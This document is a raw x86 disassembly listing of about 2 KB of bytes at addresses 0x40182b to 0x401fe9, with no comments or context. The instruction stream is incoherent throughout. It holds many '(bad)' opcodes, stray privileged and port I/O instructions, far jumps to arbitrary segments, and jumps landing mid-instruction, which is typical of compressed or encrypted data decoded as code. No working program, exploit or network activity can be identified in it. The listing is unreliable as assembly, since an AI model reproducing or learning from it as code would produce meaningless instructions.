  40182b:	sub    esp,DWORD PTR [ebx+0x62]
  40182e:	lock jle 0x4017c8
  401831:	rol    al,1
  401833:	ja     0x401847
  401835:	je     0x4017d2
  401837:	xlat   BYTE PTR ds:[ebx]
  401838:	mov    dh,BYTE PTR [ebp-0x1794466d]
  40183e:	lods   al,BYTE PTR ds:[esi]
  40183f:	cmp    BYTE PTR [ebx+esi*1+0x74],dl
  401843:	mov    ebp,0x592ecf56
  401848:	arpl   WORD PTR [esi-0x54c0d13c],cx
  40184e:	cmc    
  40184f:	xchg   ebx,eax
  401850:	pop    eax
  401851:	or     ebx,DWORD PTR cs:[edx+0x53b8415]
  401858:	dec    edx
  401859:	mov    ch,cl
  40185b:	push   cs
  40185c:	cmp    eax,0x97bc2db4
  401861:	inc    esi
  401862:	add    al,0xf2
  401864:	(bad)  
  401865:	fprem  
  401867:	or     eax,0xb9124ceb
  40186c:	fadd   st,st(3)
  40186e:	leave  
  40186f:	inc    esp
  401870:	mov    ds,ebp
  401872:	jbe    0x40189e
  401874:	sbb    ebp,DWORD PTR [esi+ecx*8]
  401877:	icebp  
  401878:	(bad)  
  401879:	into   
  40187a:	push   ebx
  40187b:	push   0x68e430ae
  401880:	push   esp
  401881:	repnz and bl,0xda
  401885:	jmp    0x401882
  401887:	addr16 push ebx
  401889:	ss int3 
  40188b:	std    
  40188c:	(bad)  
  40188d:	rcl    ebp,1
  40188f:	xchg   edi,eax
  401890:	xor    al,0xa5
  401892:	add    ecx,DWORD PTR [eax]
  401894:	cmp    ah,al
  401896:	cmovns esi,DWORD PTR [edx+0x3e]
  40189a:	inc    ebx
  40189b:	stos   DWORD PTR es:[edi],eax
  40189c:	xor    bh,BYTE PTR [ebx+0x161fc624]
  4018a2:	enter  0x88a2,0x54
  4018a6:	mov    al,ds:0x8b4f73fe
  4018ab:	shr    BYTE PTR [ebp+0x1ced03dc],0x66
  4018b2:	cmp    DWORD PTR [ecx+eiz*1+0x69],edi
  4018b6:	lock jmp 0x40190c
  4018b9:	ss inc eax
  4018bb:	shl    BYTE PTR [ebx-0x80113c3],1
  4018c1:	xor    eax,0xe82407e1
  4018c6:	sbb    DWORD PTR [edx],0x4b
  4018c9:	loope  0x40186b
  4018cb:	mov    esi,0x9e558891
  4018d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4018d1:	and    ebx,DWORD PTR [ebx+0x14]
  4018d4:	lds    ebp,FWORD PTR [edx]
  4018d6:	in     al,0x44
  4018d8:	push   0x164177f8
  4018dd:	cmp    DWORD PTR [ebx],esi
  4018df:	sub    DWORD PTR fs:[esi],eax
  4018e2:	leave  
  4018e3:	mov    ecx,0x149c3a73
  4018e8:	shl    DWORD PTR [edi],0x86
  4018eb:	in     al,0x98
  4018ed:	cs and al,0xef
  4018f0:	pop    es
  4018f1:	mov    ebx,esi
  4018f3:	lods   eax,DWORD PTR ds:[esi]
  4018f4:	mov    ds:0x17c4d24b,eax
  4018f9:	sti    
  4018fa:	add    DWORD PTR [ecx-0x59c7d1ed],ebp
  401900:	adc    eax,0x9754d3d
  401905:	mov    ds:0xc7b990b4,eax
  40190a:	retf   0xe85
  40190d:	lods   al,BYTE PTR ds:[esi]
  40190e:	pop    ss
  40190f:	mov    esi,0x838e8fc3
  401914:	xchg   esp,eax
  401915:	imul   edx,edx,0xffffffac
  401918:	mov    esi,0x6ba60ca8
  40191d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40191e:	pop    esp
  40191f:	cmp    ah,BYTE PTR [ecx+0x7c10eeb6]
  401925:	push   esp
  401926:	retf   0xc3c1
  401929:	(bad)  
  40192a:	jbe    0x40198f
  40192c:	jb     0x401952
  40192e:	mov    cl,0xee
  401930:	push   ebx
  401931:	sub    edx,ebx
  401933:	arpl   WORD PTR [ebp-0x665b6eef],dx
  401939:	mov    bh,0xb
  40193b:	xchg   ebp,eax
  40193c:	stc    
  40193d:	jecxz  0x4018fd
  40193f:	xchg   ebp,eax
  401940:	dec    esp
  401941:	mov    edi,0x553efcaa
  401946:	ja     0x401907
  401948:	sub    cl,cl
  40194a:	push   ebx
  40194b:	sbb    ebp,eax
  40194d:	fild   WORD PTR [eax+0x9]
  401950:	je     0x401933
  401952:	jmp    0x4018dc
  401954:	sub    ebx,DWORD PTR [esi+0x592a256c]
  40195a:	imul   edi,DWORD PTR [esi],0xd5f554ab
  401960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401961:	fmulp  st(5),st
  401963:	inc    eax
  401964:	ret    0x57aa
  401967:	lea    edx,[edx+0x1f]
  40196a:	mov    edx,edi
  40196c:	into   
  40196d:	xor    esi,DWORD PTR [esi]
  40196f:	loop   0x401916
  401971:	pop    es
  401972:	or     eax,DWORD PTR [esi-0x4d]
  401975:	inc    ecx
  401976:	jmp    0xe6c6:0x8e09d29f
  40197d:	(bad)  
  40197e:	or     al,0xc0
  401980:	xor    esp,DWORD PTR [ecx+esi*1-0x7f]
  401984:	repnz int3 
  401986:	mov    esi,ebp
  401988:	aam    0xfe
  40198a:	ins    BYTE PTR es:[edi],dx
  40198b:	add    DWORD PTR [edx-0x4a],esp
  40198e:	retf   0x2c07
  401991:	ret    0x5b2c
  401994:	test   eax,0xa9228557
  401999:	loopne 0x401a03
  40199b:	dec    esp
  40199c:	jl     0x401a08
  40199e:	mov    dl,0x1c
  4019a0:	outs   dx,DWORD PTR ds:[esi]
  4019a1:	leave  
  4019a2:	cmp    al,0xe3
  4019a4:	out    0x1a,al
  4019a6:	adc    eax,0x5c86a666
  4019ab:	pusha  
  4019ac:	dec    edi
  4019ad:	dec    esp
  4019ae:	and    DWORD PTR [esi+0x14],esp
  4019b1:	mov    edi,0x9922c366
  4019b6:	cmp    al,0x11
  4019b8:	xchg   edx,eax
  4019b9:	fcomp  DWORD PTR [ebp+0x202bc35f]
  4019bf:	daa    
  4019c0:	xor    DWORD PTR [eax-0x69],esi
  4019c3:	and    BYTE PTR ds:0x3a6ac113,0x20
  4019ca:	jg     0x401a3a
  4019cc:	mov    ebp,0x5bfc2f21
  4019d1:	mov    eax,0x405e91f3
  4019d6:	aaa    
  4019d7:	arpl   WORD PTR [ebx-0x38],bp
  4019da:	or     esp,esp
  4019dc:	int3   
  4019dd:	(bad)  
  4019df:	lahf   
  4019e0:	dec    edx
  4019e1:	mov    ecx,0xdeb85dcb
  4019e6:	test   BYTE PTR [ebx-0x10b2907c],cl
  4019ec:	push   edi
  4019ed:	loop   0x4019a1
  4019ef:	loop   0x4019f3
  4019f1:	adc    ebx,esp
  4019f3:	in     eax,0x9f
  4019f5:	push   ds
  4019f6:	sti    
  4019f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019f8:	pop    ebx
  4019f9:	or     al,0xcb
  4019fb:	and    bl,BYTE PTR [esi+esi*4+0xc]
  4019ff:	inc    edx
  401a00:	dec    ebp
  401a01:	inc    ebx
  401a02:	dec    edi
  401a03:	cmp    BYTE PTR [esp+ecx*1+0x26],ch
  401a07:	call   0x3f2e3d0e
  401a0c:	sub    DWORD PTR [eax],eax
  401a0e:	adc    DWORD PTR [eax-0x58375f7],ebp
  401a14:	out    0x73,eax
  401a16:	call   0x5dde1778
  401a1b:	and    BYTE PTR [esi],0xad
  401a1e:	and    BYTE PTR [ebx+0x79],dl
  401a21:	rcr    bl,0x5a
  401a24:	push   0xf69d5861
  401a29:	or     al,0x2e
  401a2b:	out    0x2b,al
  401a2d:	ins    BYTE PTR es:[edi],dx
  401a2e:	and    al,0x95
  401a30:	jne    0x4019da
  401a32:	popf   
  401a33:	clc    
  401a34:	test   BYTE PTR [edi+0x65],cl
  401a37:	adc    al,0x2
  401a39:	sub    eax,0x44024623
  401a3e:	popf   
  401a3f:	scas   al,BYTE PTR es:[edi]
  401a40:	aas    
  401a41:	js     0x401a1d
  401a43:	addr16 into 
  401a45:	sahf   
  401a46:	lock adc cl,BYTE PTR [ecx+ebx*4+0x4c561865]
  401a4e:	cs jmp 0xf241:0x1e26cac2
  401a56:	mov    al,0xa2
  401a58:	pop    ebp
  401a59:	int    0x7c
  401a5b:	sub    BYTE PTR [edi+0x1b4f7b83],bl
  401a61:	jl     0x401a74
  401a63:	mov    bh,0xfb
  401a65:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  401a67:	dec    esp
  401a68:	jp     0x401a66
  401a6a:	sbb    eax,DWORD PTR [esi]
  401a6c:	xlat   BYTE PTR ds:[ebx]
  401a6d:	scas   al,BYTE PTR es:[edi]
  401a6e:	or     al,0x8f
  401a70:	imul   edx,DWORD PTR [ecx+edx*2+0x11],0x1c6e95fd
  401a78:	in     al,0x4
  401a7a:	jns    0x401ad4
  401a7c:	rcl    DWORD PTR [edi-0x23],cl
  401a7f:	add    eax,0xfbfea71c
  401a84:	push   eax
  401a85:	dec    ebx
  401a86:	adc    bh,cl
  401a88:	loopne 0x401a9c
  401a8a:	into   
  401a8b:	(bad)  
  401a8c:	jmp    0x5a4d8aa1
  401a91:	or     BYTE PTR [edx+0x3b],al
  401a94:	push   edx
  401a95:	dec    esp
  401a96:	fwait
  401a97:	push   0x235fc8fc
  401a9c:	(bad)  
  401a9d:	mov    ebx,0x389af377
  401aa2:	ds aas 
  401aa4:	sbb    al,0x24
  401aa6:	ret    0x26c5
  401aa9:	mov    DWORD PTR [ebx-0x36],eax
  401aac:	dec    ebp
  401aad:	jmp    0x401ad8
  401aaf:	jno    0x401a3b
  401ab1:	cmc    
  401ab2:	sub    bh,ch
  401ab4:	test   DWORD PTR [eax],0xead8f228
  401aba:	bound  ebx,QWORD PTR [eax+ebp*1+0x3fb7174b]
  401ac1:	cmp    al,0x7e
  401ac3:	adc    eax,0x8b822e04
  401ac8:	ficom  WORD PTR [ebx]
  401aca:	fisub  DWORD PTR [edx-0x3881a5da]
  401ad0:	pop    ss
  401ad1:	sbb    DWORD PTR [edx*1-0xe82d31b],esi
  401ad8:	xchg   BYTE PTR [edx-0x39],bh
  401adb:	push   ecx
  401adc:	fsubr  DWORD PTR [ebx+0x765ebfd]
  401ae2:	adc    ebp,DWORD PTR [ebx]
  401ae4:	popf   
  401ae5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ae6:	iret   
  401ae7:	jbe    0x401ac8
  401ae9:	std    
  401aea:	sub    DWORD PTR [edx-0x23d87faf],ebp
  401af0:	idiv   DWORD PTR [edi+0x7a]
  401af3:	ror    BYTE PTR [ecx],1
  401af5:	mov    ah,0xd0
  401af7:	jg     0x401b70
  401af9:	inc    BYTE PTR [eax+0xeef72e4]
  401aff:	dec    esi
  401b00:	mov    al,BYTE PTR [esp+edi*4-0x650ec8ab]
  401b07:	in     eax,0x33
  401b09:	xor    ch,cl
  401b0b:	pop    eax
  401b0c:	jle    0x401b81
  401b0e:	dec    di
  401b10:	xor    ecx,DWORD PTR [esi-0x3de15bb6]
  401b16:	dec    ebx
  401b17:	not    ah
  401b19:	mov    eax,ds:0x5f795d3f
  401b1e:	pop    ebx
  401b1f:	mov    ds:0x8055bf8c,al
  401b24:	pop    esi
  401b25:	js     0x401b47
  401b27:	sub    eax,0x103c065a
  401b2c:	mov    DWORD PTR [edx-0x543e6a5e],ebx
  401b32:	add    eax,DWORD PTR [ecx+0x39]
  401b35:	arpl   dx,bx
  401b37:	je     0x401b2e
  401b39:	loop   0x401b69
  401b3b:	pusha  
  401b3c:	dec    esp
  401b3d:	rcr    BYTE PTR [esi-0x7a],cl
  401b40:	shl    DWORD PTR [edx+0x6144ff65],1
  401b46:	clc    
  401b47:	mov    bh,0x29
  401b49:	cmc    
  401b4a:	inc    edi
  401b4b:	sub    esi,ecx
  401b4d:	lods   eax,DWORD PTR ds:[esi]
  401b4e:	xlat   BYTE PTR ds:[ebx]
  401b4f:	lods   al,BYTE PTR ds:[esi]
  401b50:	dec    edx
  401b51:	test   BYTE PTR [ecx],bh
  401b53:	ins    BYTE PTR es:[edi],dx
  401b54:	test   DWORD PTR [eax],esi
  401b56:	jns    0x401b8e
  401b58:	or     edx,DWORD PTR [esi+0x55c89683]
  401b5e:	mov    bl,BYTE PTR [eax]
  401b60:	je     0x401b2f
  401b62:	jo     0x401b8b
  401b64:	xchg   edx,eax
  401b65:	mov    bl,dh
  401b67:	aaa    
  401b68:	fdiv   QWORD PTR [eax]
  401b6a:	or     al,0x64
  401b6c:	xor    edi,DWORD PTR [di+0x312f]
  401b71:	sbb    dl,bh
  401b73:	leave  
  401b74:	inc    edi
  401b75:	push   0x765a326c
  401b7a:	push   0xc9fe993c
  401b7f:	popf   
  401b80:	les    ebp,FWORD PTR [esi+ebx*1+0x5aea012b]
  401b87:	or     esp,DWORD PTR [eax-0x32d128c9]
  401b8d:	dec    edx
  401b8e:	mov    bh,0x8
  401b90:	cld    
  401b91:	nop
  401b92:	in     al,0xcd
  401b94:	mov    al,ch
  401b96:	fisubr DWORD PTR [esi]
  401b98:	icebp  
  401b99:	or     DWORD PTR [esp+ecx*4+0x7022c5c9],ecx
  401ba0:	pop    edx
  401ba1:	xchg   esi,eax
  401ba2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ba3:	xor    BYTE PTR [eax+0x53],cl
  401ba6:	push   es
  401ba7:	inc    ecx
  401ba8:	mov    ecx,0xda67f7d0
  401bad:	neg    DWORD PTR [esi]
  401baf:	xor    eax,0x2a21af81
  401bb4:	jle    0x401bc3
  401bb6:	jbe    0x401b80
  401bb8:	sbb    eax,DWORD PTR [ebp-0x60]
  401bbb:	and    BYTE PTR [ebx+0x3d31d954],dl
  401bc1:	or     dh,BYTE PTR [eax]
  401bc3:	xor    dh,dh
  401bc5:	imul   ebx,DWORD PTR ds:0x4c5188d,0x6cf23d4b
  401bcf:	ja     0x401bae
  401bd1:	ror    ecx,cl
  401bd3:	inc    ecx
  401bd4:	cdq    
  401bd5:	(bad)  
  401bd8:	dec    edi
  401bd9:	inc    edi
  401bda:	adc    eax,0xeb91bc2c
  401bdf:	pop    es
  401be0:	adc    BYTE PTR [ecx-0xc],dl
  401be3:	sahf   
  401be4:	aad    0xea
  401be6:	push   0x15433a87
  401beb:	and    DWORD PTR [ebp+0x64],edi
  401bee:	sub    cl,ch
  401bf0:	(bad)  
  401bf1:	(bad)
  401bf4:	ds int 0x47
  401bf7:	sbb    eax,0x6aa3efe
  401bfc:	mov    ds:0x2cbf20c1,al
  401c01:	sahf   
  401c02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c03:	mov    esp,0xb59af55b
  401c08:	add    BYTE PTR [ecx-0xc],cl
  401c0b:	push   cs
  401c0c:	xlat   BYTE PTR ds:[ebx]
  401c0d:	rcl    DWORD PTR [edi+0x33],0x96
  401c11:	push   edx
  401c12:	xor    eax,0xb613690d
  401c17:	(bad)  [ebx]
  401c19:	mov    edx,0x6789f7eb
  401c1e:	retf   
  401c1f:	mov    bl,0x49
  401c21:	mov    bh,0x78
  401c23:	mov    ecx,DWORD PTR [eax]
  401c25:	cdq    
  401c26:	add    eax,0xb13a0d9b
  401c2b:	jno    0x401c96
  401c2d:	push   eax
  401c2e:	mov    ecx,ebp
  401c30:	mov    esi,0xc5e68a43
  401c35:	ins    DWORD PTR es:[edi],dx
  401c36:	push   edi
  401c37:	dec    edi
  401c38:	sub    eax,0x757f2687
  401c3d:	cmp    ecx,DWORD PTR [ecx+0x48]
  401c40:	and    eax,0x2b4f2f97
  401c45:	js     0x401c36
  401c47:	sahf   
  401c48:	push   es
  401c49:	ret    0x4128
  401c4c:	cmp    bh,BYTE PTR [edx+0x603f6426]
  401c52:	xchg   ebx,eax
  401c53:	icebp  
  401c54:	or     BYTE PTR [edi+0x1f],cl
  401c57:	mov    ds:0xe4aa06f1,eax
  401c5c:	mov    esi,gs
  401c5e:	std    
  401c5f:	cld    
  401c60:	push   0x981323b5
  401c65:	and    bh,BYTE PTR [esi]
  401c67:	(bad)  
  401c68:	gs pop ss
  401c6a:	push   0xfffffff6
  401c6c:	dec    ecx
  401c6d:	mov    dh,0x1c
  401c6f:	dec    edi
  401c70:	fst    DWORD PTR [esi+eax*8-0x50]
  401c74:	xchg   eax,ebx
  401c76:	xchg   esp,eax
  401c77:	sub    al,0x71
  401c79:	dec    esp
  401c7a:	retf   0x263f
  401c7d:	jp     0x401c65
  401c7f:	ret    
  401c80:	std    
  401c81:	cli    
  401c82:	js     0x401c3a
  401c84:	inc    edx
  401c85:	cmp    al,0x52
  401c87:	xchg   ecx,eax
  401c88:	out    0xb3,eax
  401c8a:	or     eax,0x1b862264
  401c8f:	add    BYTE PTR [esp+eax*2-0x77dd4d35],al
  401c96:	jg     0x401cb1
  401c98:	(bad)  
  401c99:	repz dec esp
  401c9b:	pushf  
  401c9c:	push   ebx
  401c9d:	sbb    DWORD PTR [edi],ebp
  401c9f:	int    0x68
  401ca1:	lds    ebx,FWORD PTR [edx]
  401ca3:	shr    cl,1
  401ca5:	pop    ebp
  401ca6:	cld    
  401ca7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ca8:	and    eax,0xa0759dfa
  401cad:	fiadd  DWORD PTR [ebx]
  401caf:	jo     0x401c88
  401cb1:	ret    0xe207
  401cb4:	jmp    0x66de:0x5503b73c
  401cbb:	shr    DWORD PTR [edx-0x59265471],cl
  401cc1:	fdivrp st(5),st
  401cc3:	inc    esi
  401cc4:	sahf   
  401cc5:	pop    eax
  401cc6:	add    esp,DWORD PTR [eax]
  401cc8:	hlt    
  401cc9:	(bad)  
  401cca:	push   DWORD PTR [eax]
  401ccc:	pop    ss
  401ccd:	cwde   
  401cce:	cmc    
  401ccf:	mov    bh,0x6f
  401cd1:	dec    edx
  401cd2:	jl     0x401d4a
  401cd4:	push   esi
  401cd6:	mov    ebp,0xc2d19b3
  401cdc:	mov    dl,0x37
  401cde:	jb     0x401cef
  401ce0:	gs stc 
  401ce2:	lods   eax,DWORD PTR ds:[esi]
  401ce3:	inc    eax
  401ce4:	in     eax,dx
  401ce5:	pop    eax
  401ce6:	lock push ss
  401ce8:	mov    al,ds:0x4fd028ac
  401ced:	int3   
  401cee:	jnp    0x401cdb
  401cf0:	out    dx,al
  401cf1:	or     DWORD PTR [ebx-0x6d],ebx
  401cf4:	(bad)  
  401cf5:	sbb    al,0x2e
  401cf7:	push   edi
  401cf8:	lea    ebp,[edx+0x46]
  401cfb:	data16 fsubr QWORD PTR [ebp+0x127ab730]
  401d02:	push   es
  401d03:	mov    esi,0x85405b4c
  401d08:	jmp    0x484be7a7
  401d0d:	adc    al,0x22
  401d0f:	jb     0x401d40
  401d11:	pop    edi
  401d12:	rcl    edi,1
  401d14:	outs   dx,DWORD PTR ds:[esi]
  401d15:	or     ah,BYTE PTR [edx]
  401d17:	sbb    BYTE PTR [edi-0x8],ah
  401d1a:	dec    eax
  401d1b:	adc    DWORD PTR [esi],edi
  401d1d:	repz mov ecx,0x5c6ea563
  401d23:	pop    esi
  401d24:	xlat   BYTE PTR ds:[ebx]
  401d25:	or     eax,0xc004cfd8
  401d2a:	jecxz  0x401ce3
  401d2c:	cwde   
  401d2d:	int    0x70
  401d2f:	mov    esi,esp
  401d31:	(bad)  
  401d32:	jl     0x401d10
  401d34:	inc    ebp
  401d35:	push   ss
  401d36:	mov    eax,0xc63a0f53
  401d3b:	sub    BYTE PTR [edi],ah
  401d3d:	add    BYTE PTR [edx+0x33],dh
  401d40:	es cdq 
  401d42:	sahf   
  401d43:	mov    DWORD PTR [esp+ebx*1+0x4eb4b4c0],0x7af82f7e
  401d4e:	ins    BYTE PTR es:[edi],dx
  401d4f:	jp     0x401d11
  401d51:	dec    ecx
  401d52:	out    0x79,al
  401d54:	add    DWORD PTR [ebp+0x43537ef],0xffffff90
  401d5b:	(bad)  
  401d5c:	clc    
  401d5d:	sbb    dl,BYTE PTR [ebx-0x25]
  401d60:	xchg   ebp,eax
  401d61:	test   edx,ebx
  401d63:	mov    dh,bl
  401d65:	fisubr WORD PTR [esi-0x2a]
  401d68:	sub    eax,0xf8c6e140
  401d6d:	xor    eax,0xcb2bcff1
  401d72:	xor    ebp,esp
  401d74:	dec    ebx
  401d75:	mov    WORD PTR [ebp+0x2e37cca2],?
  401d7b:	and    DWORD PTR [edx-0x2fa8c1d7],ebp
  401d81:	jno    0x401d0f
  401d83:	xchg   edx,eax
  401d84:	xor    eax,0x270ec1c
  401d89:	into   
  401d8a:	int    0xf7
  401d8c:	jno    0x401d7b
  401d8e:	pop    ebp
  401d8f:	xor    eax,0xee0d4538
  401d94:	mov    dh,0xb7
  401d96:	(bad)  
  401d98:	icebp  
  401d99:	les    edi,FWORD PTR [edx+edx*2+0x41]
  401d9d:	leave  
  401d9e:	loope  0x401d27
  401da0:	sbb    cl,BYTE PTR [ebx+0x1d61737a]
  401da6:	adc    ch,BYTE PTR [edx+0x2f]
  401da9:	out    0x9e,al
  401dab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401dac:	fsubr  QWORD PTR [ebx+0x5]
  401daf:	in     eax,dx
  401db0:	push   eax
  401db1:	sub    eax,0xb81a7e68
  401db6:	push   ebx
  401db7:	cmp    al,0xff
  401db9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401dba:	or     BYTE PTR [ebx-0x5a],dl
  401dbd:	retf   
  401dbe:	add    bl,BYTE PTR [edx-0x731e7d6d]
  401dc4:	dec    eax
  401dc5:	pop    es
  401dc6:	adc    BYTE PTR [ecx-0x29b7c11e],dh
  401dcc:	mov    ah,0x80
  401dce:	add    eax,0x5db4e3ee
  401dd3:	in     al,dx
  401dd4:	enter  0xff5d,0x27
  401dd8:	add    eax,0xf754496d
  401ddd:	stc    
  401dde:	(bad)  
  401ddf:	or     al,0x22
  401de1:	sub    al,0xd7
  401de3:	pop    ss
  401de4:	jmp    0x7911:0xfb594910
  401deb:	test   BYTE PTR [edx+eiz*1+0x56],0x76
  401df0:	stos   DWORD PTR es:[edi],eax
  401df1:	jge    0x401e29
  401df3:	mov    ch,0x79
  401df5:	mov    BYTE PTR ss:[edx],dh
  401df8:	(bad)  
  401df9:	sti    
  401dfa:	stos   DWORD PTR es:[edi],eax
  401dfb:	mov    ch,0x93
  401dfd:	xchg   esp,eax
  401dfe:	adc    eax,0xe1339c10
  401e03:	rcl    DWORD PTR [ebx],cl
  401e05:	push   ebx
  401e06:	xchg   ebp,eax
  401e07:	out    0xee,al
  401e09:	add    eax,0x560507ad
  401e0e:	xchg   esi,ebx
  401e10:	dec    edi
  401e11:	scas   eax,DWORD PTR es:[edi]
  401e12:	sub    bh,BYTE PTR [ecx]
  401e14:	bound  esp,QWORD PTR ds:0x9eb680d7
  401e1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e1b:	push   ds
  401e1c:	sbb    DWORD PTR [ebp+0x4b17dc5b],ecx
  401e22:	gs jl  0x401e86
  401e25:	lahf   
  401e26:	jae    0x401e07
  401e28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e29:	cmp    ebp,DWORD PTR [ebx-0x31]
  401e2c:	div    BYTE PTR [eax+0xc24b6f0]
  401e32:	xor    ebx,DWORD PTR [edi-0x27dfd6db]
  401e38:	pop    esp
  401e39:	sub    ecx,ecx
  401e3b:	enter  0x5391,0xcc
  401e3f:	pop    ebp
  401e40:	test   eax,0xe3ee04d1
  401e45:	mov    ?,WORD PTR ds:0x5a8dfa6b
  401e4b:	push   0xffffffb3
  401e4d:	cdq    
  401e4e:	jnp    0x401e76
  401e50:	mov    ebp,gs
  401e52:	test   eax,0xbc3343f7
  401e57:	xor    DWORD PTR [edx],ebp
  401e59:	lock test ch,dl
  401e5c:	cmp    bl,al
  401e5e:	(bad)  
  401e5f:	retf   
  401e60:	xor    eax,0x7063b7a1
  401e65:	xchg   esp,eax
  401e66:	mov    fs,edi
  401e68:	popa   
  401e69:	add    al,0x8e
  401e6b:	nop
  401e6c:	cmp    bl,0xad
  401e6f:	rol    BYTE PTR [esi+0x421f6afc],0x2d
  401e76:	dec    ebx
  401e77:	or     eax,0x2af820b0
  401e7c:	fdivr  QWORD PTR [ebx+ebx*1+0x66]
  401e80:	add    bh,BYTE PTR [si+0x37eb]
  401e85:	jecxz  0x401ede
  401e87:	mov    ch,0xf6
  401e89:	outs   dx,DWORD PTR ds:[esi]
  401e8a:	cmp    bl,ch
  401e8c:	aaa    
  401e8d:	dec    ebx
  401e8e:	scas   al,BYTE PTR es:[edi]
  401e8f:	aad    0x10
  401e91:	cmp    eax,0x69ca3d85
  401e96:	xchg   ebx,esp
  401e98:	jp     0x401ead
  401e9a:	sub    al,0x19
  401e9c:	popf   
  401e9d:	xchg   BYTE PTR [ebx-0x1e],dh
  401ea0:	into   
  401ea1:	add    bl,dh
  401ea3:	dec    esp
  401ea4:	cwde   
  401ea5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ea6:	popa   
  401ea7:	add    al,0x6
  401ea9:	xchg   cl,ch
  401eab:	jbe    0x401f29
  401ead:	mov    edx,0x8994fca8
  401eb2:	in     al,0xf4
  401eb4:	clc    
  401eb5:	xchg   esp,eax
  401eb6:	stc    
  401eb7:	icebp  
  401eb8:	pop    eax
  401eb9:	in     eax,0x82
  401ebb:	and    eax,0xed7ed0d6
  401ec0:	(bad)  
  401ec1:	daa    
  401ec2:	stos   BYTE PTR es:[edi],al
  401ec3:	mov    ebx,0xe46669e9
  401ec8:	add    esi,DWORD PTR [eax+ecx*2-0x112d8318]
  401ecf:	xor    eax,0x83fa57a1
  401ed4:	and    BYTE PTR [esi+0x2a],ah
  401ed7:	adc    DWORD PTR [eax+edx*1+0x39],eax
  401edb:	mov    WORD PTR [ebx+0x58608452],gs
  401ee1:	(bad)  
  401ee2:	fs xchg ebp,eax
  401ee4:	xor    edi,DWORD PTR [ebp+0x2]
  401ee7:	adc    cl,BYTE PTR [ebx]
  401ee9:	sbb    al,0xee
  401eeb:	cli    
  401eec:	icebp  
  401eed:	pop    edx
  401eee:	push   cs
  401eef:	push   edx
  401ef0:	cli    
  401ef1:	popa   
  401ef2:	dec    esp
  401ef3:	cli    
  401ef4:	push   ecx
  401ef5:	pop    esi
  401ef6:	punpckhwd mm0,QWORD PTR [edx]
  401ef9:	and    eax,0xd521db9c
  401efe:	push   edi
  401eff:	xor    BYTE PTR [esi+0x65],dl
  401f02:	daa    
  401f03:	sub    eax,0xa6d6e1e6
  401f08:	add    DWORD PTR [ebp-0x4d],esi
  401f0b:	stos   BYTE PTR es:[edi],al
  401f0c:	mov    ch,0x4a
  401f0e:	in     eax,dx
  401f0f:	jmp    0x6238a275
  401f14:	repnz scas eax,DWORD PTR es:[edi]
  401f16:	cmc    
  401f17:	jmp    0x75d0a1e0
  401f1c:	mov    esp,0xc77f0fea
  401f21:	cmc    
  401f22:	xor    DWORD PTR [edx+edi*1+0x1a],ebx
  401f26:	sar    DWORD PTR [ecx-0x36],0x6f
  401f2a:	inc    edi
  401f2b:	in     al,dx
  401f2c:	popf   
  401f2d:	fsubr  QWORD PTR [edi-0x5546cb1]
  401f33:	pop    esi
  401f34:	adc    eax,DWORD PTR [ebx]
  401f36:	addr16 push edx
  401f38:	lods   al,BYTE PTR ds:[esi]
  401f39:	addr16 pop ecx
  401f3b:	test   BYTE PTR [bx+di+0x7c],dl
  401f3f:	(bad)  
  401f41:	mov    edi,0xbbbda0c5
  401f46:	mov    al,ds:0xba61df5
  401f4b:	jo     0x401fbe
  401f4d:	scas   eax,DWORD PTR es:[edi]
  401f4e:	into   
  401f4f:	(bad)  
  401f50:	inc    BYTE PTR [edx+0xe]
  401f53:	sub    eax,DWORD PTR [eax+0x6d]
  401f56:	popf   
  401f57:	stos   DWORD PTR es:[edi],eax
  401f58:	add    eax,0x16ccfdb2
  401f5d:	in     eax,dx
  401f5e:	out    0xfa,al
  401f60:	leave  
  401f61:	popa   
  401f62:	aad    0x4d
  401f64:	jne    0x401fce
  401f66:	add    eax,0xc262b209
  401f6b:	aaa    
  401f6c:	(bad)  
  401f6d:	xor    BYTE PTR [eax-0x190d1b69],ch
  401f73:	rcl    DWORD PTR ds:0x43920fdb,1
  401f79:	aas    
  401f7a:	test   dh,0xb4
  401f7d:	and    bh,bl
  401f7f:	loopne 0x401fdb
  401f81:	pop    es
  401f82:	cmp    edx,esi
  401f84:	cmp    BYTE PTR ds:0x3d9b81ee,0x3f
  401f8b:	fidiv  DWORD PTR [ebx+0x32431552]
  401f91:	jmp    0xa0a5:0x261e604a
  401f98:	jp     0x402003
  401f9a:	or     ecx,0x53e6ca90
  401fa0:	in     al,dx
  401fa1:	or     DWORD PTR [esi+0x5a],ebx
  401fa4:	and    esp,esi
  401fa6:	and    DWORD PTR [ebp-0x3f],ebp
  401fa9:	cmp    DWORD PTR [edx],esi
  401fab:	and    ebx,edx
  401fad:	and    esi,DWORD PTR [ecx-0x6ff119ef]
  401fb3:	mov    dh,bl
  401fb5:	mul    dl
  401fb7:	push   ebp
  401fb8:	xor    eax,0x839cd5c1
  401fbd:	js     0x401fa5
  401fbf:	std    
  401fc0:	mov    edx,0x26ee483e
  401fc5:	loope  0x401fc5
  401fc7:	mov    ecx,0x496adbb6
  401fcc:	pop    eax
  401fcd:	add    dh,BYTE PTR [ebx-0x57]
  401fd0:	pop    edi
  401fd1:	sbb    eax,0xb6b65dee
  401fd6:	dec    ebx
  401fd7:	inc    ebp
  401fd8:	sbb    DWORD PTR [ecx],edi
  401fda:	dec    edx
  401fdb:	das    
  401fdc:	shl    BYTE PTR [edx+0x77c56e03],0xea
  401fe3:	test   BYTE PTR [edx],cl
  401fe5:	or     esp,DWORD PTR [edx]
  401fe7:	les    ecx,FWORD PTR [eax]
  401fe9:	lds    ecx,FWORD PTR [edx+ebp*2-0x6]
